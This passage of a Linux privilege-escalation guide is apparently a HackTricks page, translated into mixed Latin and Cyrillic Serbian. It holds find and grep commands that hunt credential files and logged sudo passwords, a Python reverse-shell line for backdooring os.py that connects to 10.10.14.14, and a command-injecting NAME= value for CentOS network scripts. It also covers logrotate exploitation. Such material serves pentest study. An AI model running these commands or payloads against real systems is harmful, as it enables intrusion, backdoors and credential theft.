### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/binarni fajlovi u PATH-u**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržati lozinke**.\
**Još jedan interesantan alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koji je open source aplikacija koja se koristi za dobijanje velikog broja lozinki koje su sačuvane na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete da čitate logove, možda ćete u njima pronaći **zanimljive/poverljive informacije**. Što je log čudniji, to će verovatno biti interesantniji.\
Takođe, neki **loše** konfigurisani (backdoored?) **audit logs** mogu vam omogućiti da **zabeležite lozinke** unutar audit logova, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Za čitanje logova, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti od velike pomoći.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe treba da proverite fajlove koji u nazivu ili u sadržaju sadrže reč "**password**", kao i da proverite IP adrese i email-ove u logovima, ili regexp-e za hasheve. Neću ovde nabrajati kako da se sve ovo uradi, ali ako vas zanima možete pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Datoteke koje su upisive

### Python library hijacking

Ako znate **odakle** će se python skripta izvršavati i **možete pisati u** tom folderu ili možete **modify python libraries**, možete izmeniti OS biblioteku i backdoor-ovati je (ako možete pisati tamo gde će se python skripta izvršavati, kopirajte i nalepite biblioteku os.py).

Da biste **backdoor the library**, samo dodajte na kraj biblioteke os.py sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate eksploatacija

Ranljivost u `logrotate` omogućava korisnicima sa **pravom za pisanje** na log fajl ili njegovim roditeljskim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što se `logrotate`, često pokreće kao **root**, može manipulisati da izvrši proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost pogađa `logrotate` verzije `3.18.0` i starije

Više detalja o ranjivosti možete naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god nađete da možete menjati logove, proverite ko upravlja tim logovima i da li možete eskalirati privilegije zamenom logova sa symlinkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako iz bilo kog razloga korisnik može **upisati** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može **izmeniti** postojeću, tada je vaš sistem kompromitovan.

Network skripte, na primer _ifcg-eth0_, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su ~sourced~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, vrednost `NAME=` u ovim network skriptama nije pravilno obrađena. Ako imate **prazan razmak u imenu, sistem pokušava da izvrši deo posle tog razmaka**. To znači da se **sve posle prvog razmaka izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Напомена: размак између Network и /bin/id_)

### **init, init.d, systemd, and rc.d**

Директорijum `/etc/init.d` садржи **skripte** за System V init (SysVinit), **klasični Linux систем за управљање сервисима**. Укључује skripte које `start`, `stop`, `restart`, и понекад `reload` сервисе. Оне се могу извршити директно или преко симболичких линкова који се налазе у `/etc/rc?.d/`. Алтернативна путања на Redhat системима је `/etc/rc.d/init.d`.

С друге стране, `/etc/init` је повезан са **Upstart**, новијим **системом за управљање сервисима** који је увео Ubuntu, користећи конфигурационе фајлове за задатке управљања сервисима. Упркос транзицији на Upstart, SysVinit skripte се и даље користе уз Upstart конфигурације због compatibility слоя у Upstart-у.

**systemd** представља модеран init и менаџер сервиса, нудећи напредне функције као што су покретање даemona на захтев, управљање automount-ом и снимци стања система. Он организује фајлове у `/usr/lib/systemd/` за distribution пакете и `/etc/systemd/system/` за измене администратора, поједностављујући процес администрације система.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks често hook-ују syscall да би екстраховали привилеговану kernel функционалност и изложили је userspace manager-у. Слаба аутентификација manager-а (нпр. провере потписа засноване на FD-order или лоши шеме лозинки) може омогућити локалној апликацији да се према manager-у представи као он и ескалира до root-а на уређајима који су већ root-овани. Сазнајте више и детаље експлоатације овде:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery у VMware Tools/Aria Operations може издвојити путању до бинарног фајла из command line-а процеса и извршити је са -v у привилегованом контексту. Permissive pattern-и (нпр. коришћење \S) могу поклопити listener-е које је нападач поставио у уписивим локацијама (нпр. /tmp/httpd), што може довести до извршења као root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
